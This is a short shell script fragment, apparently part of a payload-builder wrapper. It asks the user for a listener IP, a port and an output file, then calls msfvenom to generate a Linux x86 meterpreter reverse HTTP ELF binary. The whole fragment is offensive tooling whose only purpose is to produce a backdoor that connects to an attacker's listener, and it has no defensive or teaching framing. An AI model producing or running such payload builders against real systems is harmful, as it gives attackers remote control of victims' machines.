	echo "Platform : Linux/Reverse HTTP Shell"
	echo ""
	echo -n "Enter Listener IP: "
	read IP

	echo Using IP : $IP

        echo -n "Enter Listener Port: "
        read PORT

	echo Using Port : $PORT

	echo -n "Where Should I Say The Output?: "
	read OUTPUT

	echo Saving TO $OUTPUT

	msfvenom -p linux/x86/meterpreter/reverse_http LHOST=$IP LPORT=$PORT -f elf > $OUTPUT
